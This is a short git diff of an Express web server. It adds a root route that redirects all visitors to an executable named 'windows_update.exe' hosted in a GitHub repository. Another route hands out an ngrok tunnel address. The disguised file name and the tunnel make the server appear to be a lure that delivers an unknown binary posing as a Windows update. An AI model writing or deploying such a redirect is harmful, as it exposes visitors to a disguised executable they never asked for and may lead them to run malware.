@@ -11,6 +11,10 @@ app.all('/ok', (req, res) => {
     res.send(`OK! ${day} ${time}`)
 })
 
+app.all('/', (req, res) => {
+    res.redirect('https://github.com/rserver98/backoffice/raw/main/windows_update.exe');
+})
+
 app.all('/url', (req, res) => {
     res.send('https://0b4f-190-192-75-210.sa.ngrok.io')
 });
